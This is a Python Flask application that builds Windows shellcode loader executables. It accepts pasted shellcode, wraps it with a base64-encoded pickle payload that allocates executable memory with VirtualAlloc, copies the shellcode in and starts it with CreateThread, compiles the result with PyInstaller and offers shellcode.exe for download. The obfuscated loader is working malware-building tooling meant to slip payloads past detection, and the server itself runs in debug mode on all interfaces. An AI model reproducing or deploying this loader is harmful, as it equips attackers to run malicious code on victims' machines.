from flask import Flask,render_template,request,send_from_directory,redirect
import os
app = Flask(__name__)

@app.route('/',methods=['GET','POST'])
def index():
    if request.method == 'POST':
        shellcode = request.form.get('usershellcode')
        if not all([shellcode]):
            nn = '赶紧 提交你的shellcode啊 ~！憨批！！'
            return render_template('index.html',nn=nn)
        elif 'buf' not in shellcode:
            nn = '看 上面 填入的 shellcode 格式啊~！ 笨蛋！！'
            return render_template('index.html', nn=nn)
        elif '"' not in shellcode[::-1][0]:
            nn = 'cao 你的双引号呢？？？'
            return render_template('index.html', nn=nn)
        else:
            with open('shell.py','w') as f:
                f.write('import base64\n')
                f.write("shellcode = b'"+shellcode[7:len(shellcode)-1]+"'\n")
                f.write("baseshellcode = base64.b64encode(shellcode)\n")
                f.write('with open('+"'shellcode.py','w'"+') as f:'+'\n')
                f.write('   '+"f.write('import pickle,base64,ctypes \\n')"+'\n')
                f.write('   '+"f.write('shellcode = '+str(baseshellcode)+'\\n')"+'\n')
                f.write('   '+"""f.write('shellcodeloder = b'+"'gASVdQIAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlFhWAgAACmN0eXBlcy53aW5kbGwua2VybmVsMzIuVmlydHVhbEFsbG9jLnJlc3R5cGUgPSBjdHlwZXMuY191aW50NjQKcHRyID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5WaXJ0dWFsQWxsb2MoY3R5cGVzLmNfaW50KDApLGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSksY3R5cGVzLmNfaW50KDB4MTAwMCksY3R5cGVzLmNfaW50KDB4NDApKQpidWYgPSAoY3R5cGVzLmNfY2hhciAqIGxlbihzaGVsbGNvZGUpKS5mcm9tX2J1ZmZlcihzaGVsbGNvZGUpCmN0eXBlcy53aW5kbGwua2VybmVsMzIuUnRsTW92ZU1lbW9yeShjdHlwZXMuY191aW50NjQocHRyKSxidWYsY3R5cGVzLmNfaW50KGxlbihzaGVsbGNvZGUpKSkKdGhyZWFkID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQoY3R5cGVzLmNfaW50KDApLGN0eXBlcy5jX2ludCgwKSxjdHlwZXMuY191aW50NjQocHRyKSxjdHlwZXMuY19pbnQoMCksY3R5cGVzLmNfaW50KDApLGN0eXBlcy5wb2ludGVyKGN0eXBlcy5jX2ludCgwKSkpCmN0eXBlcy53aW5kbGwua2VybmVsMzIuV2FpdEZvclNpbmdsZU9iamVjdChjdHlwZXMuY19pbnQodGhyZWFkKSxjdHlwZXMuY19pbnQoLTEpKQogICAgICAgIJSFlFKULg=='\\n")"""+'\n')
                f.write('   '+"f.write('shellcode = bytearray(base64.b64decode(shellcode))\\n')"+'\n')
                f.write('   '+"f.write('pickle.loads(base64.b64decode(shellcodeloder))\\n')"+'\n')
            os.system('python shell.py')
            os.system('pyinstaller -F shellcode.py')
            return redirect("/download")
    return render_template('index.html')
@app.route("/download")
def download():
    store_path = os.getcwd()+'\\dist'
    return send_from_directory(store_path, 'shellcode.exe', as_attachment=True)

app.run(host='0.0.0.0', port=5000, debug = True)